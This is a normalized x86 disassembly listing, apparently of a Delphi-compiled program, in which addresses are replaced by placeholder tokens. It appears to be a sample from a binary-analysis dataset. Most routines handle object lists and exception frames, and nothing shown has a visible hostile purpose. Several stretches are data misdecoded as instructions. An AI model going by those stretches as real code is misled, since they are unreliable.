mov ebp esp
xor eax eax
push ebp
push sub_423f59
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f60
retn
sub_423fd8
fdivr [ edi ]
inc edx
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
insd
dec eax
insb
jo r-xdata
insb
aas
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 ] dl
outsb
je r-xdata
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11147265
inc eax
add [ ecx ] al
xchg ebx eax
cld
outsb
je r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc ecx
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
adc al 0x45
dec eax
insb
jo r-xdata
add [ eax + 0x33 ] dh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
add ah bl
insd
inc eax
jae r-xdata
inc eax
outsb
je r-xdata
jns r-xdata
cmp cl [ ecx ]
dec eax
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
jo r-xdata
or [ eax + 0x65 ] ecx
insb
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
inc eax
add [ eax - 0x7bffbfcd ] al
xor eax [ eax ]
js r-xdata
inc eax
add ah bl
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ esi ] cl
jns r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x424094c0 ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
inc ecx
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
insb
je r-xdata
movlps [ ecx + 0x45 ] xmm1
js r-xdata
add bh bh
dec [ ebx + 0x424018c0 ]
add [ edi ] cl
add eax 0xffffffd8
jmp sub_424e24
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
aas
inc eax
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] bl
xor [ eax ] eax
push cs
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
push esi
je r-xdata
or [ eax + 0x65 ] ecx
insb
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
inc eax
inc edx
add bh bh
call [ eax + eax * 2 + 0x42 ]
lodsd [ esi ]
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
imul esp [ ebp + 0x77 ] 0x3fd87265
adc ecx [ ecx + 0x45 ]
insd
adc al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc edx
jo r-xdata
outsb
dec eax
insb
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_424cff
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
outsb
je r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0x40147265
inc edx
add [ ecx ] al
xchg bx ax
cld
jo r-xdata
cmp cl [ ecx ]
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ecc
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc004241 ] cl
add [ eax ] al
add [ eax + 0x70004010 ] ah
xor eax [ eax ]
jl r-xdata
imul ebp [ edi + 0x6e ] 0x7800408d
inc ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x41 ] bh
jae r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
adc al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
outsb
je r-xdata
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
adc al 0x41
inc edx
add [ eax ] al
add [ eax ] al
add bh bh
dec [ ebp + 0x41140040 ]
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f60
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d06
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048f4
lea eax [ ebp - 0x8 ]
call sub_4054b4
retn
inc ebx
xor edi edi
outsd
outsb
je r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
jae r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_423564
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4054cc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
dec [ ebx + 0x423fa8c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
sub_424330
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_4243a6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4244bc
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4054cc
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4243ad
lea eax [ ebp - 0x8 ]
call sub_4054b4
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424448
mov [ rw-data ] eax
sub_4243b4
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424448
mov [ rw-data ] eax
mov ecx r-xdata
call sub_4054f8
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42440c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_4054cc
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_424448
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4030f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_423528
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423528
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423528
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_403e78
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40344c
mov eax esi
pop esi
pop ebx
retn
call sub_4034a4
pop [ fs : 0x0 ]
add esp 0xc
sub_4244bc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4245bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42440c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423578
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_4054b4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cc80
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_4054b4
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40cc80
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42440c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423578
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42440c
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_423578
mov ecx r-xdata
call sub_4054f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4245c4
lea eax [ ebp - 0xc ]
call sub_4054b4
lea eax [ ebp - 0x8 ]
call sub_4054b4
retn
sub edx 0xfffffff8
sub_4245dc
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42461c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42464c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4247de
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424779
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4247e5
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
mov eax esi
xor edx edx
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403128
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_423564
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_4247ec
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_4248d1
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248d8
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048f4
lea eax [ ebp - 0x8 ]
call sub_4054b4
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_423564
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4054cc
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_423564
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4054cc
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_4248f4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x20 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424af9
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor edi edi
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x24
mov edx ebx
call sub_403ecc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b00
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
test edi edi
jne r-xdata
inc ebx
xor esi esi
cmp edi 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_404338
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3fc
call sub_4038b4
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x10 ] esi
inc edi
dec edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_423564
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
xor esi esi
xor edx edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
call sub_403128
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_423564
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x18 ]
call sub_403128
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0xc ]
dec [ ebp - 0x24 ]
jne r-xdata
sub_424b08
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_424bfb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403ecc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c02
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048f4
lea eax [ ebp - 0x10 ]
call sub_4054b4
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_423564
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4054cc
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_424c20
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_424cff
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403ecc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3c0
call sub_4038b4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d06
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_4048f4
lea eax [ ebp - 0x8 ]
call sub_4054b4
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_423564
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4054cc
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_4054f8
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_424d20
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405528
xor eax eax
push ebp
push sub_424d6f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
lea eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
call sub_4054cc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d76
lea eax [ ebx + 0xc ]
call sub_4054b4
sub_424d7c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404328
xor eax eax
push ebp
push sub_424e11
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403ecc
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_424b08
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424e18
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax ebx
call sub_42461c
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_42464c
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4247ec
sub_424e3c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_423564
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_423564
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4137a8
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_423564
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4137a8
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4137a8
sub_424ec8
push ebx
push esi
call sub_4034b4
mov ebx edx
mov esi eax
mov eax esi
call sub_4245dc
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403128
mov eax [ esi + 0x14 ]
call sub_403128
mov eax [ esi + 0x10 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4054b4
pop esi
pop ebx
retn
mov eax esi
call sub_40349c
sub_424f1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424f53
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424f5a
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_424f84
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424fa9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424fb0
retn
sub_424fc0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ eax + 0x42 ] dl
add [ eax + eax ] cl
add [ eax ] al
fsubr [ ebp + 0x40 ]
add [ eax + 0x33 ] dh
inc eax
